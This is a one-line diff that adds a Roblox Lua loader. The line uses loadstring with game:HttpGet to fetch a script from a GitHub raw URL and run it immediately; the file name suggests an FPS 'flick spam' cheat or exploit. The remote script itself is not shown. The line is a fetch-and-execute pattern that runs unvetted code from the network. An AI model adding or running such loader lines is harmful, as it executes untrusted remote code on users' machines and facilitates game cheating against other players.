@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/fps-flick-spam2-6l8yhhicgrc9gk.lua"))()
